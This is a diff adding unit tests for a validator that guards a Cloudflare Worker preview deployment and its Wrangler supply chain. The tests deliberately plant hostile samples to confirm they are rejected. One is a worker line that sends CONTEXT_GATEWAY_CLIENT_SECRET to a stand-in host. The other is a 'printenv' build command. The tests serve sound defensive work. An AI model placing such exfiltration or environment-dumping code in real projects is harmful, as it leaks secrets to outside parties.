@@ -42,9 +42,29 @@ class CloudflareEdgeCandidateTests(unittest.TestCase):
         self.assertIn("workflow_dispatch:", workflow)
         self.assertIn("versions upload --env preview", workflow)
         self.assertIn("--preview-alias voice-review", workflow)
-        self.assertIn('wranglerVersion: "4.120.0"', workflow)
+        self.assertIn("python trusted/tools/verify_wrangler_artifact.py", workflow)
+        self.assertNotIn("cloudflare/wrangler-action@", workflow)
         self.assertNotIn("wrangler deploy", workflow)
         self.assertNotIn("versions deploy", workflow)
+
+    def test_upload_executes_only_repository_verified_wrangler_artifact(self) -> None:
+        workflow = MODULE.WORKFLOW.read_text(encoding="utf-8")
+        self.assertNotIn("cloudflare/wrangler-action@", workflow)
+        for marker in (
+            "path: trusted",
+            "trusted/runtime/cloudflare-edge/wrangler-integrity.json",
+            "python trusted/tools/verify_wrangler_artifact.py",
+            "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
+            'node-version: "24.14.0"',
+            "curl --fail --location --proto '=https' --tlsv1.2",
+            "npm install --ignore-scripts",
+            'node "$RUNNER_TEMP/wrangler-verified/node_modules/wrangler/bin/wrangler.js"',
+        ):
+            self.assertIn(marker, workflow)
+        self.assertLess(
+            workflow.index("python trusted/tools/verify_wrangler_artifact.py"),
+            workflow.index('node "$RUNNER_TEMP/wrangler-verified/node_modules/wrangler/bin/wrangler.js"'),
+        )
 
     def test_voice_review_is_access_verified_and_context_gateway_only(self) -> None:
         worker = MODULE.WORKER.read_text(encoding="utf-8")
@@ -155,6 +175,23 @@ class CloudflareEdgeCandidateTests(unittest.TestCase):
                 MODULE.validate(candidate),
             )
 
+    def test_validator_refuses_unreviewed_worker_code(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            candidate = pathlib.Path(temporary)
+            shutil.copytree(ROOT / "runtime", candidate / "runtime")
+            shutil.copytree(ROOT / ".github", candidate / ".github")
+            worker_path = candidate / "runtime" / "cloudflare-edge" / "src" / "index.js"
+            worker_path.write_text(
+                worker_path.read_text(encoding="utf-8")
+                + '\nexport const leak = () => globalThis["fetch"]('
+                + '"https://untrusted.example.test", CONTEXT_GATEWAY_CLIENT_SECRET);\n',
+                encoding="utf-8",
+            )
+            self.assertIn(
+                "Worker implementation digest does not match the reviewed artifact",
+                MODULE.validate(candidate),
+            )
+
     def test_validator_refuses_preview_environment_provider_binding(self) -> None:
         with tempfile.TemporaryDirectory() as temporary:
             candidate = pathlib.Path(temporary)
@@ -190,6 +227,25 @@ class CloudflareEdgeCandidateTests(unittest.TestCase):
             )
             self.assertIn(
                 "preview logs must remain disabled until content-free readback is verified",
+                errors,
+            )
+
+    def test_validator_refuses_candidate_controlled_wrangler_build(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            candidate = pathlib.Path(temporary)
+            shutil.copytree(ROOT / "runtime", candidate / "runtime")
+            shutil.copytree(ROOT / ".github", candidate / ".github")
+            config_path = candidate / "runtime" / "cloudflare-edge" / "wrangler.jsonc"
+            config = MODULE.load_jsonc(config_path)
+            config["build"] = {"command": "printenv"}
+            config_path.write_text(json.dumps(config), encoding="utf-8")
+            errors = MODULE.validate(candidate)
+            self.assertIn(
+                "executable Wrangler configuration is forbidden: ['build']",
+                errors,
+            )
+            self.assertIn(
+                "Wrangler configuration digest does not match the reviewed artifact",
                 errors,
             )
 
